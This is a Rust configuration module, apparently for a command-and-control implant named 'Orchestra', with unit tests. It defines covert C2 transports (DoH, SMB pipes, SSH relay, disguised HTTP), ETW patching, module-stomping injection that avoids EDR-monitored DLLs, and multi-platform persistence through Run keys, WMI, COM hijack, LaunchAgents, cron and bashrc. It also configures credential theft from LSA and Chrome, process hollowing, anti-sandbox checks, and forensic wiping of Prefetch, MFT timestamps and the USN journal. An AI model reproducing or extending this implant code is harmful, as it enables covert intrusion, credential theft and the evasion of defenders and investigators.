    /// Security override for IMDS body failures. When `true`, a host that
    /// passes IMDS reachability checks but does not return a parseable
    /// instance-id is still treated as trusted for VM-refusal bypass.
    ///
    /// Trade-off: this weakens identity binding from an exact instance-id to
    /// metadata reachability only. Keep `false` unless IMDS body access is
    /// unreliable in your environment.
    #[serde(default)]
    pub cloud_instance_allow_without_imds: bool,
    /// Fallback instance-id pattern list used only when IMDS instance-id
    /// retrieval fails. If at least one non-empty pattern is configured and
    /// the host matches an expected cloud hypervisor signature, VM-refusal can
    /// be bypassed as a break-glass fallback.
    ///
    /// Trade-off: this is less strict than exact `cloud_instance_id` matching
    /// and should be used sparingly; prefer exact ID pinning whenever possible.
    #[serde(default)]
    pub cloud_instance_fallback_ids: Vec<String>,
    /// Extra expected hypervisor name fragments for niche cloud providers.
    /// Each non-empty entry is matched case-insensitively against Linux DMI
    /// `product_name` in addition to the built-in cloud hypervisor list used
    /// by `is_expected_hypervisor`.
    ///
    /// Trade-off: broad values (for example, "virtual") can over-match and
    /// weaken VM-refusal enforcement. Keep entries provider-specific.
    #[serde(default)]
    pub vm_detection_extra_hypervisor_names: Vec<String>,
    /// When `true`, the VM-detection threshold is guaranteed to be at least 3
    /// regardless of cloud-detection results.  Useful on restricted networks
    /// where IMDS is firewalled and DMI strings are not in the built-in
    /// expected-hypervisor list, preventing false-positive VM refusals.
    ///
    /// Default: `false` (backward-compatible behaviour).
    #[serde(default)]
    pub vm_detection_high_threshold_mode: bool,
    /// SSH relay hostname for the `ssh-transport` feature.
    #[serde(default)]
    pub ssh_host: Option<String>,
    /// SSH relay port (default 22).
    #[serde(default)]
    pub ssh_port: Option<u16>,
    /// SSH username for authentication.
    #[serde(default)]
    pub ssh_username: Option<String>,
    /// SSH authentication configuration.
    #[serde(default)]
    pub ssh_auth: Option<SshAuthConfig>,
    /// Expected SHA-256 fingerprint of the SSH server host key (hex, optional).
    /// When set the agent rejects servers whose key does not match.  When
    /// absent the agent accepts any key but logs a warning.
    #[serde(default)]
    pub ssh_host_key_fingerprint: Option<String>,
    /// Controls when the direct-patch ETW bypass is applied.
    ///
    /// * `safe` (default) — skip the patch on Windows 11 24H2 (build ≥ 26100)
    ///   where PatchGuard may detect ETW modifications and BSOD.
    /// * `always` — always apply, regardless of build number (testing only).
    /// * `never`  — never apply this bypass.
    #[serde(default)]
    pub etw_patch_mode: EtwPatchMode,
    /// Enable the SMB/TCP named-pipe C2 transport.  When `true` the agent
    /// attempts to connect via a Windows named pipe before falling through
    /// to DoH / HTTP / direct TLS.  Windows-only; ignored on other platforms.
    #[serde(default)]
    pub smb_pipe_enabled: bool,
    /// Target host for the named-pipe transport (e.g. `"10.0.0.5"`).
    /// Required when `smb_pipe_enabled = true`.
    #[serde(default)]
    pub smb_pipe_host: Option<String>,
    /// Pipe name on the target host.  Defaults to `"orchestra"`.
    #[serde(default)]
    pub smb_pipe_name: Option<String>,
    /// Operating mode: `"smb"` connects directly to `\\host\pipe\name`
    /// over SMB; `"tcp_relay"` connects to a local TCP port that a relay
    /// on the pivot host forwards to the named pipe.
    #[serde(default)]
    pub smb_pipe_mode: Option<String>,
    /// TCP port for the local relay in `tcp_relay` mode.  Defaults to 4455.
    #[serde(default)]
    pub smb_tcp_relay_port: Option<u16>,
    /// DNS query prefix used by the DoH transport when constructing beacon
    /// and task queries.  Defaults to the compile-time random constant
    /// `IOC_DNS_BEACON` generated per build.  When overridden, the same
    /// value must be configured on the server's DoH listener.
    #[serde(default = "default_dns_prefix")]
    pub dns_prefix: String,
}

/// Authentication method for the SSH covert transport.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
#[serde(rename_all = "kebab-case", tag = "type")]
pub enum SshAuthConfig {
    /// Authenticate with an SSH private key loaded from disk at runtime.
    Key { key_path: String },
    /// Authenticate with a password (less secure; use key-based auth in
    /// production).
    Password { password: String },
    /// Delegate to the running ssh-agent process via the `SSH_AUTH_SOCK`
    /// environment variable.  Not available on Windows.
    Agent,
}

fn default_user_agent() -> String {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".to_string()
}
fn default_uri() -> String {
    "/api/v1/update".to_string()
}
fn default_host_header() -> String {
    "cdn.example.com".to_string()
}
fn default_doh_beacon_sentinel() -> String {
    "1.2.3.4".to_string()
}
fn default_dns_prefix() -> String {
    crate::ioc::IOC_DNS_BEACON.to_string()
}

impl Default for MalleableProfile {
    fn default() -> Self {
        Self {
            user_agent: default_user_agent(),
            uri: default_uri(),
            host_header: default_host_header(),
            cdn_relay: false,
            dns_over_https: false,
            direct_c2_endpoint: String::new(),
            doh_beacon_sentinel: default_doh_beacon_sentinel(),
            doh_server_url: None,
            cdn_endpoint: String::new(),
            kill_date: String::new(),
            cloud_instance_id: None,
            cloud_instance_allow_without_imds: false,
            cloud_instance_fallback_ids: Vec::new(),
            vm_detection_extra_hypervisor_names: Vec::new(),
            vm_detection_high_threshold_mode: false,
            ssh_host: None,
            ssh_port: None,
            ssh_username: None,
            ssh_auth: None,
            ssh_host_key_fingerprint: None,
            etw_patch_mode: EtwPatchMode::default(),
            smb_pipe_enabled: false,
            smb_pipe_host: None,
            smb_pipe_name: None,
            smb_pipe_mode: None,
            smb_tcp_relay_port: None,
            dns_prefix: default_dns_prefix(),
        }
    }
}

/// Configuration for injection techniques (module stomping, etc.).
///
/// Controls which DLLs are considered as sacrificial hosts when the module-
/// stomping injector overwrites a `.text` section in a remote process.  The
/// candidate list and exclusion patterns are evaluated at runtime, allowing
/// operators to tailor behaviour per engagement without rebuilding the agent.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct InjectionConfig {
    /// Ordered list of DLL names (case-insensitive) that the module-stomp
    /// injector will attempt to load into the target process via
    /// `LdrLoadDll` when no already-loaded DLL is suitable.  Earlier entries
    /// are tried first.  Defaults to a curated set of low-visibility DLLs.
    ///
    /// Example: `["dwmapi.dll", "uxtheme.dll", "netprofm.dll"]`
    #[serde(default = "default_sacrificial_dlls")]
    pub sacrificial_dll_candidates: Vec<String>,

    /// Substring patterns (case-insensitive) for DLLs that must **never** be
    /// stomped, even if they have a suitably large `.text` section.  Use this
    /// to exclude DLLs known to be monitored by EDR/AV products.
    ///
    /// Defaults include well-known IoCs such as `amsi.dll`, `ws2_32.dll`,
    /// `kernel32.dll`, `ntdll.dll`, etc.  Operators can append additional
    /// patterns without overriding the built-in list.
    #[serde(default = "default_dll_exclusion_patterns")]
    pub dll_exclusion_patterns: Vec<String>,

    /// When `true` (the default), the module-stomp injector also appends
    /// the built-in exclusion patterns on top of any operator-supplied ones.
    /// Set to `false` to use *only* `dll_exclusion_patterns` as-is, which
    /// lets operators deliberately include a DLL that is excluded by default.
    #[serde(default = "default_true")]
    pub append_default_exclusions: bool,
}

impl Default for InjectionConfig {
    fn default() -> Self {
        Self {
            sacrificial_dll_candidates: default_sacrificial_dlls(),
            dll_exclusion_patterns: default_dll_exclusion_patterns(),
            append_default_exclusions: true,
        }
    }
}

fn default_sacrificial_dlls() -> Vec<String> {
    vec![
        "dwmapi.dll".into(),
        "uxtheme.dll".into(),
        "netprofm.dll".into(),
        "devobj.dll".into(),
        "cryptbase.dll".into(),
        "version.dll".into(),
        "wer.dll".into(),
        "msimg32.dll".into(),
        "d3d10.dll".into(),
        "propsys.dll".into(),
    ]
}

fn default_dll_exclusion_patterns() -> Vec<String> {
    Vec::new() // operator-supplied only; built-ins are added by the agent
}

/// Built-in exclusion patterns that are always applied unless
/// `append_default_exclusions` is `false`.  These are DLLs known to be
/// heavily monitored by EDR/AV products and must never be stomped.
pub const BUILTIN_DLL_EXCLUSIONS: &[&str] = &[
    "ntdll",
    "kernel32",
    "kernelbase",
    "crypt32",
    "dbghelp",
    "version",
    "secur32",
    "wintrust",
    "mscoree",
    "clrjit",
    "amsi",
    "ws2_32",
    "wininet",
    "winhttp",
    "urlmon",
    "ieframe",
    "msvcrt",
    "ucrtbase",
    "sspicli",
    "rpcrt4",
    "profapi",
    "bcrypt",
    "bcryptprimitives",
    "ncrypt",
    "schannel",
    "digest",
    "user32",
    "gdi32",
    "advapi32",
    "ole32",
    "oleaut32",
    "combase",
    "shell32",
    "shlwapi",
];

/// Check whether a lowercased DLL name matches any exclusion pattern.
///
/// Used by the module-stomp injector to decide if a loaded DLL should be
/// skipped as a sacrificial host.  This function is cross-platform so it
/// can be tested on Linux dev machines.
///
/// - `lname`: the DLL filename in **lowercase** (e.g. `"ntdll.dll"`).
/// - `operator_exclusions`: substring patterns from operator config.
/// - `builtin`: built-in prefix patterns (typically [`BUILTIN_DLL_EXCLUSIONS`]).
///
/// Returns `true` if the DLL should be excluded.
pub fn is_dll_excluded(lname: &str, operator_exclusions: &[String], builtin: &[&str]) -> bool {
    // Reject very short names (unlikely to be real DLLs, probably artifacts)
    if lname.len() < 5 {
        return true;
    }
    let lname_lower = lname.to_ascii_lowercase();
    // Check operator-supplied patterns (substring match, case-insensitive)
    for pat in operator_exclusions {
        if lname_lower.contains(&pat.to_ascii_lowercase()) {
            return true;
        }
    }
    // Check built-in exclusion list (prefix match, case-insensitive)
    for pat in builtin {
        if lname_lower.starts_with(&pat.to_ascii_lowercase()) {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod injection_tests {
    use super::*;

    #[test]
    fn test_dll_excluded_builtin_patterns() {
        let builtin: &[&str] = &[
            "ntdll", "kernel32", "kernelbase", "amsi", "ws2_32", "wininet",
            "user32", "gdi32", "advapi32", "ole32", "shell32", "crypt32",
        ];
        let operator: Vec<String> = Vec::new();

        assert!(is_dll_excluded("ntdll.dll", &operator, builtin));
        assert!(is_dll_excluded("kernel32.dll", &operator, builtin));
        assert!(is_dll_excluded("amsi.dll", &operator, builtin));
        assert!(is_dll_excluded("ws2_32.dll", &operator, builtin));

        assert!(!is_dll_excluded("dwmapi.dll", &operator, builtin));
        assert!(!is_dll_excluded("uxtheme.dll", &operator, builtin));
        assert!(!is_dll_excluded("netprofm.dll", &operator, builtin));
    }

    #[test]
    fn test_dll_excluded_operator_patterns() {
        let builtin: &[&str] = &[];
        let operator: Vec<String> = vec!["suspicious".to_string(), "malware".to_string()];

        assert!(is_dll_excluded("suspicious_lib.dll", &operator, builtin));
        assert!(is_dll_excluded("some_malware_helper.dll", &operator, builtin));
        assert!(!is_dll_excluded("dwmapi.dll", &operator, builtin));
    }

    #[test]
    fn test_dll_excluded_short_names() {
        let builtin: &[&str] = &[];
        let operator: Vec<String> = Vec::new();

        // Names shorter than 5 chars should be excluded (e.g., "x.dl" = 4 chars)
        assert!(is_dll_excluded("x.dl", &operator, builtin));
        assert!(is_dll_excluded("a", &operator, builtin));
        assert!(!is_dll_excluded("a.dll", &operator, builtin));
        assert!(!is_dll_excluded("abcde.dll", &operator, builtin));
    }

    #[test]
    fn test_dll_excluded_case_insensitive() {
        let builtin: &[&str] = &["ntdll"];
        let operator: Vec<String> = vec!["MYCUSTOM".to_string()];

        assert!(is_dll_excluded("NTDLL.DLL", &operator, builtin));
        assert!(is_dll_excluded("Ntdll.dll", &operator, builtin));
        assert!(is_dll_excluded("mycustom_thing.dll", &operator, builtin));
    }

    #[test]
    fn test_dll_excluded_combined_builtin_and_operator() {
        let builtin: &[&str] = &["ntdll", "amsi"];
        let operator: Vec<String> = vec!["custom".to_string()];

        assert!(is_dll_excluded("ntdll.dll", &operator, builtin));
        assert!(is_dll_excluded("amsi.dll", &operator, builtin));
        assert!(is_dll_excluded("custom_lib.dll", &operator, builtin));
        assert!(!is_dll_excluded("dwmapi.dll", &operator, builtin));
    }

    #[test]
    fn test_builtin_exclusions_constant() {
        // Verify the constant contains expected entries
        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"ntdll"));
        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"amsi"));
        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"ws2_32"));
        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"kernel32"));
        assert!(BUILTIN_DLL_EXCLUSIONS.contains(&"user32"));
        // Should not contain harmless DLLs
        assert!(!BUILTIN_DLL_EXCLUSIONS.contains(&"dwmapi"));
        assert!(!BUILTIN_DLL_EXCLUSIONS.contains(&"uxtheme"));
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct Config {
    #[serde(default)]
    pub sleep: SleepConfig,
    #[serde(default)]
    pub malleable_profile: MalleableProfile,
    #[serde(default)]
    pub exec_strategy: ExecStrategy,
    #[serde(default = "default_allowed_paths")]
    pub allowed_paths: Vec<String>,
    #[serde(default = "default_heartbeat")]
    pub heartbeat_interval_secs: u64,
    #[serde(default)]
    pub persistence_enabled: bool,
    #[serde(default = "default_module_repo")]
    pub module_repo_url: String,
    /// Base64-encoded AES-256-GCM key used to decrypt signed capability modules.
    /// Distinct from `module_verify_key`; a module must pass *both* decryption
    /// (authenticated by GCM tag) and signature verification before it is loaded.
    #[serde(default, alias = "module_signing_key")]
    pub module_aes_key: Option<String>,
    /// Base64-encoded Ed25519 verifying (public) key used to check the 64-byte
    /// signature prepended to each module after decryption.  Required when the
    /// `module-signatures` feature is enabled.  If absent the compile-time
    /// constant `MODULE_SIGNING_PUBKEY` is used instead.
    #[serde(default)]
    pub module_verify_key: Option<String>,
    /// Directory from which `DeployModule` loads pre-staged module blobs.
    /// Defaults to `~/.cache/orchestra/modules` on Unix and
    /// `%LOCALAPPDATA%\Orchestra\modules` on Windows.
    #[serde(default = "default_module_cache_dir")]
    pub module_cache_dir: String,
    /// Wire-level traffic shaping profile. See [`TrafficProfile`] and
    /// [`crate::normalized_transport`] for details.
    #[serde(default)]
    pub traffic_profile: TrafficProfile,
    /// If set, the agent will refuse to start unless the host machine is
    /// joined to this DNS domain (case-insensitive).
    #[serde(default)]
    pub required_domain: Option<String>,
    /// When `true`, the agent refuses to start when virtualization or
    /// sandbox artifacts are detected. Defaults to `false` because most
    /// legitimate enterprise endpoints today are virtualized.
    #[serde(default)]
    pub refuse_in_vm: bool,
    /// When `true`, the agent refuses to start if a debugger is attached to
    /// the agent process itself. Defaults to `false`; debugger detection is
    /// otherwise reported as telemetry only.
    #[serde(default)]
    pub refuse_when_debugged: bool,
    /// Optional sandbox-score threshold. When set, startup is refused only if
    /// the combined sandbox score is greater than or equal to this value.
    /// Leave unset to keep sandbox scoring informational.
    #[serde(default)]
    pub sandbox_score_threshold: Option<u32>,
    /// SHA-256 fingerprint (64 lowercase hex chars) of the Orchestra Control
    /// Center's TLS certificate. When set, `outbound-c` mode pins the server
    /// certificate instead of accepting any certificate.
    ///
    /// Generate with:
    ///   openssl x509 -in server.crt -outform DER | sha256sum
    #[serde(default)]
    pub server_cert_fingerprint: Option<String>,
    /// Maximum number of concurrent connections for port scanning.
    #[serde(default = "default_port_scan_concurrency")]
    pub port_scan_concurrency: usize,
    /// Timeout in milliseconds for each port connection during scans.
    #[serde(default = "default_port_scan_timeout")]
    pub port_scan_timeout_ms: u64,
    /// Fine-grained control over which persistence mechanisms are enabled.
    /// Defaults to all mechanisms on; operators can selectively disable
    /// individual mechanisms without rebuilding the agent.
    #[serde(default)]
    pub persistence: PersistenceConfig,
    /// ETW bypass method. Defaults to [`EtwPatchMethod::Direct`] (overwrite
    /// function entry with `ret`) when absent. Set to `hwbp` to use the
    /// hardware-breakpoint VEH approach instead.
    #[serde(default)]
    pub etw_patch_method: Option<EtwPatchMethod>,
    /// P2P link heartbeat interval in seconds.  Each side of a P2P link sends
    /// a `LinkHeartbeat` frame at this interval.  If no heartbeat or data frame
    /// is received within `3 * p2p_heartbeat_interval_secs`, the link is
    /// considered dead.  Default: 30 s.
    #[serde(default = "default_p2p_heartbeat")]
    pub p2p_heartbeat_interval_secs: u64,
    /// Interval in seconds between periodic self-re-encoding passes.  Only
    /// effective when the agent is compiled with the `self-reencode` feature.
    /// Default: 14 400 s (4 hours).
    #[serde(default = "default_reencode_interval")]
    pub reencode_interval_secs: u64,
    /// Fine-grained control over injection behaviour (module stomping DLL
    /// candidates, exclusion patterns, etc.).
    #[serde(default)]
    pub injection: InjectionConfig,
    /// Configuration for the Evanesco continuous-memory-hiding subsystem.
    /// Only effective when the agent is compiled with the `evanesco` feature.
    /// When absent from the TOML file, sensible defaults are used.
    #[serde(default)]
    pub evanesco: EvanescoConfig,
    /// Maximum time (in seconds) the C4 padding-oracle attack may spend
    /// attempting to recover the Chrome App-Bound Encryption key before
    /// falling back to elevated strategies.  Default: 60 s.
    #[serde(default = "default_browser_c4_timeout_secs")]
    pub browser_c4_timeout_secs: u64,
    /// Configuration for the LSA Whisperer credential extraction module.
    /// Interacts with LSA SSP interfaces to extract credentials without
    /// reading LSASS memory (bypasses Credential Guard and RunAsPPL).
    /// Only effective when compiled with the `lsa-whisperer` feature.
    #[serde(default)]
    pub lsa_whisperer: LsaWhispererConfig,
    /// Configuration for the indirect dynamic syscall resolution subsystem.
    /// Controls periodic SSN cache validation and fallback behaviour.
    /// Only effective when compiled with the `direct-syscalls` feature.
    #[serde(default)]
    pub syscall: SyscallConfig,
    /// Configuration for the automated EDR bypass transformation engine.
    /// Scans `.text` for known EDR signatures and applies semantic-preserving
    /// transformations (instruction substitution, register reassignment, nop
    /// sled insertion, constant splitting, jump obfuscation).
    /// Only effective when compiled with the `evasion-transform` feature.
    #[serde(default)]
    pub evasion_transform: EvasionTransformConfig,
    /// Configuration for NTFS transaction-based process hollowing.
    /// Creates an NTFS transaction, writes payload into a transaction-backed
    /// section, hollows a suspended target process, then rolls back the
    /// transaction so the on-disk artefact never existed.  Includes ETW
    /// blinding with spoofed provider GUIDs.
    /// Only effective when compiled with the `transacted-hollowing` feature.
    #[serde(default)]
    pub transacted_hollowing: TransactedHollowingConfig,

    /// Configuration for delayed module-stomp injection.
    /// Loads a sacrificial DLL, waits for EDR scan window to pass, then
    /// overwrites the DLL's `.text` section with the payload.  Defeats
    /// timing-based EDR heuristics.
    /// Only effective when compiled with the `delayed-stomp` feature.
    #[serde(default)]
    pub delayed_stomp: DelayedStompConfig,

    /// Configuration for user-mode NT kernel interface emulation.
    /// Implements frequently-used NT syscalls via kernel32/advapi32 fallbacks,
    /// eliminating all references to ntdll.dll syscall stubs.  Makes the agent
    /// invisible to EDR hooks on ntdll AND to ntdll unhooking detection.
    /// Only effective when compiled with the `syscall-emulation` feature.
    #[serde(default)]
    pub syscall_emulation: SyscallEmulationConfig,

    /// Configuration for CET (Control-flow Enforcement Technology) / Shadow
    /// Stack bypass.  Handles Windows 11 24H2+ hardware-enforced shadow
    /// stacks that defeat return-address spoofing and stack pivoting.
    /// Only effective when compiled with the `cet-bypass` feature.
    #[serde(default)]
    pub cet_bypass: CetBypassConfig,

    /// Configuration for token-only impersonation via NtImpersonateThread /
    /// SetThreadToken.  Avoids `ImpersonateNamedPipeClient` on the main
    /// agent thread, which is heavily signatured by EDR products.
    /// Only effective when compiled with the `token-impersonation` feature.
    #[serde(default)]
    pub token_impersonation: TokenImpersonationConfig,

       /// Configuration for Windows Prefetch evidence removal.  Cleans .pf
    /// files after injection or on-demand to prevent forensic timeline
    /// analysis.  Supports delete, patch (preferred), and service-disable
       /// methods.  Only effective when compiled with the `forensic-cleanup`
    /// feature.
    #[serde(default)]
    pub prefetch: PrefetchConfig,

    /// Configuration for MFT timestamp synchronisation and USN journal
    /// cleanup.  Synchronises $STANDARD_INFORMATION and $FILE_NAME
    /// timestamps in the MFT to prevent forensic timeline analysis.
    /// Optionally cleans USN journal entries and $LogFile references.
    /// Only effective when compiled with the `forensic-cleanup` feature.
    #[serde(default)]
    pub timestamps: TimestampConfig,
}

/// Per-platform list of persistence mechanisms to install.
///
/// Sensible defaults enable multiple mechanisms so that removal of one does
/// not drop persistence entirely.  Operators can disable individual mechanisms
/// (e.g., `wmi_subscription = false` on locked-down endpoints where WMI
/// commands are monitored) without rebuilding the agent.
#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct PersistenceConfig {
    // ── Windows ───────────────────────────────────────────────────────────────
    /// HKCU\Software\Microsoft\Windows\CurrentVersion\Run entry (Windows).
    #[serde(default = "default_true")]
    pub registry_run_key: bool,
    /// Copy to the user Startup folder (Windows).
    #[serde(default = "default_true")]
    pub startup_folder: bool,
    /// WMI __EventFilter + CommandLineEventConsumer subscription (Windows).
    /// Requires PowerShell and WMI access; disable on heavily-locked endpoints.
    #[serde(default = "default_true")]
    pub wmi_subscription: bool,
    /// COM server CLSID hijack via HKCU\Software\Classes\CLSID (Windows).
    /// Only effective when the agent is an in-process DLL.  Disabled by
    /// default to avoid registry noise on endpoints that do not support it.
    #[serde(default)]
    pub com_hijacking: bool,

    // ── macOS ─────────────────────────────────────────────────────────────────
    /// ~/Library/LaunchAgents plist loaded at user login (macOS).
    #[serde(default = "default_true")]
    pub launch_agent: bool,
    /// /Library/LaunchDaemons plist loaded at boot (macOS, requires root).
    #[serde(default = "default_true")]
    pub launch_daemon: bool,
    /// Login item added via osascript / System Events (macOS, user session).
    #[serde(default = "default_true")]
    pub login_item: bool,
    /// @reboot crontab entry as a fallback (macOS / Linux).
    #[serde(default = "default_true")]
    pub cron_job: bool,

    // ── Linux ─────────────────────────────────────────────────────────────────
    /// ~/.config/systemd/user service enabled at login (Linux).
    #[serde(default = "default_true")]
    pub systemd_service: bool,
    /// Append a backgrounded exec block to ~/.bashrc / ~/.profile (Linux).
    /// Disable if the shell profiles are monitored by an EDR.
    #[serde(default = "default_true")]
    pub shell_profile: bool,

    // ── IoC Override Fields ───────────────────────────────────────────────────
    /// Override the registry Run key value name (Windows).  When unset, a
    /// random 8–12 character alphanumeric string is generated at runtime.
    #[serde(default)]
    pub registry_value_name: Option<String>,
    /// Override the WMI event subscription name (Windows).  When unset, a
    /// random 8–12 character alphanumeric string is generated at runtime.
    #[serde(default)]
    pub wmi_subscription_name: Option<String>,
    /// Override the COM hijack CLSID (Windows).  When unset, a random valid
    /// CLSID is generated at runtime.
    #[serde(default)]
    pub com_hijack_clsid: Option<String>,
    /// Override the startup folder filename (Windows).  When unset, a random
    /// legitimate-sounding filename is generated at runtime.
    #[serde(default)]
    pub startup_filename: Option<String>,
}

fn default_true() -> bool {
    true
}

impl Default for PersistenceConfig {
    fn default() -> Self {
        Self {
            registry_run_key: true,
            startup_folder: true,
            wmi_subscription: true,
            com_hijacking: false,
            launch_agent: true,
            launch_daemon: true,
            login_item: true,
            cron_job: true,
            systemd_service: true,
            shell_profile: true,
            registry_value_name: None,
            wmi_subscription_name: None,
            com_hijack_clsid: None,
            startup_filename: None,
        }
    }
}

fn default_allowed_paths() -> Vec<String> {
    #[cfg(target_os = "windows")]
    {
        vec![
            "C:\\Users".into(),
            "C:\\Windows\\Temp".into(),
            "C:\\ProgramData".into(),
        ]
    }
    #[cfg(target_os = "macos")]
    {
        vec!["/Users".into(), "/var/log".into(), "/tmp".into()]
    }
    #[cfg(not(any(target_os = "windows", target_os = "macos")))]
    {
        vec!["/var/log".into(), "/home".into(), "/tmp".into()]
    }
}

fn default_heartbeat() -> u64 {
    30
}

fn default_port_scan_concurrency() -> usize {
    50
}

fn default_port_scan_timeout() -> u64 {
    200
}

fn default_module_repo() -> String {
    "https://updates.example.com/modules".into()
}

fn default_p2p_heartbeat() -> u64 {
    30
}

fn default_reencode_interval() -> u64 {
    14_400 // 4 hours
}

pub fn default_module_cache_dir() -> String {
    if cfg!(windows) {
        let base = std::env::var_os("LOCALAPPDATA")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("C:\\ProgramData"));
        base.join("Orchestra")
            .join("modules")
            .to_string_lossy()
            .into_owned()
    } else {
        // Prefer $XDG_CACHE_HOME; fall back to $HOME/.cache.
        // Never fall back to /tmp which is world-writable (M-38 fix).
        let cache_base = std::env::var_os("XDG_CACHE_HOME")
            .map(PathBuf::from)
            .or_else(|| {
                std::env::var_os("HOME")
                    .map(|h| PathBuf::from(h).join(".cache"))
            });
        cache_base
            .map(|p| p.join("orchestra").join("modules"))
            .unwrap_or_default()
            .to_string_lossy()
            .into_owned()
    }
}

impl Default for Config {
    fn default() -> Self {
        let module_cache_dir = default_module_cache_dir();
        let mut allowed_paths = default_allowed_paths();

        // Ensure the module cache directory is always in allowed_paths.
        // Without this, deployments running as root (where HOME=/root) would
        // have a module_cache_dir under /root/.cache which is not covered by
        // the Linux default allowed_paths of ["/var/log", "/home", "/tmp"].
        let cache_parent = PathBuf::from(&module_cache_dir)
            .parent()
            .and_then(|p| p.parent()) // strip .../modules -> .../orchestra -> .../cache
            .map(|p| p.to_string_lossy().into_owned());
        if let Some(parent) = cache_parent {
            if !allowed_paths.iter().any(|a| parent.starts_with(a.as_str())) {
                allowed_paths.push(module_cache_dir.clone());
            }
        }

        Self {
            allowed_paths,
            heartbeat_interval_secs: default_heartbeat(),
            persistence_enabled: false,
            module_repo_url: default_module_repo(),
            module_aes_key: None,
            module_verify_key: None,
            module_cache_dir,
            traffic_profile: TrafficProfile::default(),
            required_domain: None,
            refuse_in_vm: false,
            refuse_when_debugged: false,
            sandbox_score_threshold: None,
            server_cert_fingerprint: None,
            port_scan_concurrency: default_port_scan_concurrency(),
            port_scan_timeout_ms: default_port_scan_timeout(),
            sleep: SleepConfig::default(),
            malleable_profile: MalleableProfile::default(),
            exec_strategy: ExecStrategy::Indirect,
            persistence: PersistenceConfig::default(),
            etw_patch_method: None,
            p2p_heartbeat_interval_secs: default_p2p_heartbeat(),
            reencode_interval_secs: default_reencode_interval(),
            injection: InjectionConfig::default(),
            evanesco: EvanescoConfig::default(),
            browser_c4_timeout_secs: default_browser_c4_timeout_secs(),
            lsa_whisperer: LsaWhispererConfig::default(),
            syscall: SyscallConfig::default(),
            evasion_transform: EvasionTransformConfig::default(),
            transacted_hollowing: TransactedHollowingConfig::default(),
            delayed_stomp: DelayedStompConfig::default(),
            syscall_emulation: SyscallEmulationConfig::default(),
            cet_bypass: CetBypassConfig::default(),
            token_impersonation: TokenImpersonationConfig::default(),
            prefetch: PrefetchConfig::default(),
            timestamps: TimestampConfig::default(),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(target_os = "linux")]
    #[test]
    fn default_allowed_paths_linux() {
        let paths = default_allowed_paths();
        assert!(paths.iter().any(|p| p == "/var/log"), "Linux should include /var/log");
        assert!(paths.iter().any(|p| p == "/home"), "Linux should include /home");
        assert!(paths.iter().any(|p| p == "/tmp"), "Linux should include /tmp");
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn default_allowed_paths_macos() {
        let paths = default_allowed_paths();
        assert!(paths.iter().any(|p| p == "/Users"), "macOS should include /Users");
        assert!(paths.iter().any(|p| p == "/tmp"), "macOS should include /tmp");
    }

    #[cfg(target_os = "windows")]
    #[test]
    fn default_allowed_paths_windows() {
        let paths = default_allowed_paths();
        assert!(
            paths.iter().any(|p| p.contains("Users")),
            "Windows should include Users path"
        );
        assert!(
            paths.iter().any(|p| p.contains("Temp")),
            "Windows should include Temp path"
        );
    }

    #[test]
    fn default_config_module_cache_dir_is_accessible() {
        let cfg = Config::default();
        let cache = &cfg.module_cache_dir;
        // The module_cache_dir must be reachable via allowed_paths
        // (either directly or through a parent prefix).
        let reachable = cfg.allowed_paths.iter().any(|p| {
            cache.starts_with(p.as_str()) || p.starts_with(cache.as_str())
        });
        assert!(
            reachable,
            "module_cache_dir '{}' is not covered by allowed_paths: {:?}",
            cache,
            cfg.allowed_paths
        );
    }

    #[test]
    fn default_cloud_fallback_whitelisting_is_disabled() {
        let profile = MalleableProfile::default();
        assert!(!profile.cloud_instance_allow_without_imds);
        assert!(profile.cloud_instance_fallback_ids.is_empty());
        assert!(profile.vm_detection_extra_hypervisor_names.is_empty());
    }
}
